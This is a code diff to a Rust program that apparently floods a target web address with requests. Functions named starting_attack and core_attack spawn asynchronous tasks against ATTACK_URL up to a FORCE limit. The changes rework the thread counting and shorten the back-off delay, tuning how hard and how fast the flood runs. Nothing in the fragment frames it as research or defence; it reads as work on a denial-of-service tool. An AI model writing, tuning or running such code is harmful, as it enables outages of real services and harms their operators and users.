@@ -11,7 +11,6 @@ pub async fn start() {
     unsafe {
         starting_attack();
         loop {
-            ON_THREADS = ON_THREADS + 1;
             core_attack();
         }
     }
@@ -19,8 +18,7 @@ pub async fn start() {
 
 unsafe fn starting_attack() {
     loop {
-        if AMOUNT < crate::FORCE {
-            ON_THREADS = ON_THREADS + 1;
+        if ON_THREADS < crate::FORCE - 600 {
             core_attack();
             thread::sleep(time::Duration::from_millis(2));
         } else {
@@ -30,6 +28,7 @@ unsafe fn starting_attack() {
 }
 
 unsafe fn core_attack() {
+    ON_THREADS = ON_THREADS + 1;
     if ON_THREADS < crate::FORCE {
         tokio::spawn(async {
             let error_data = request(&crate::ATTACK_URL).await;
@@ -51,7 +50,7 @@ unsafe fn core_attack() {
             }
         });
     } else {
-        thread::sleep(time::Duration::from_millis(10));
+        thread::sleep(time::Duration::from_millis(2));
         ON_THREADS = ON_THREADS - 1;
     }
 }
